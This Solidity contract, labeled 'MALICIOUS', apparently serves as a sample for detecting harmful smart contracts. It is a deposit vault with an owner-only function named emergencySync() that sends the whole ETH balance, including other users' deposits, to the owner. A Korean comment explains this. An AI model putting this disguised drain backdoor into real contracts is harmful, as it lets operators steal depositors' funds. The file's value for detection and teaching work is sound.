// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 사용자 예치금을 보관하는 vault인데 owner가 emergencySync()를 호출하면 컨트랙트의 ETH 전액을 자신의 주소로 전송할 수 있습니다.
pragma solidity ^0.8.20;

contract AdminDrainVault {
    address payable public owner;
    mapping(address => uint256) public deposits;

    constructor() { owner = payable(msg.sender); }
    modifier onlyOwner() { require(msg.sender == owner, "owner"); _; }

    function deposit() external payable { deposits[msg.sender] += msg.value; }

    function emergencySync() external onlyOwner {
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "send");
    }

    function withdraw(uint256 amount) external {
        require(deposits[msg.sender] >= amount, "balance");
        deposits[msg.sender] -= amount;
        (bool ok,) = payable(msg.sender).call{value: amount}("");
        require(ok, "send");
    }
}
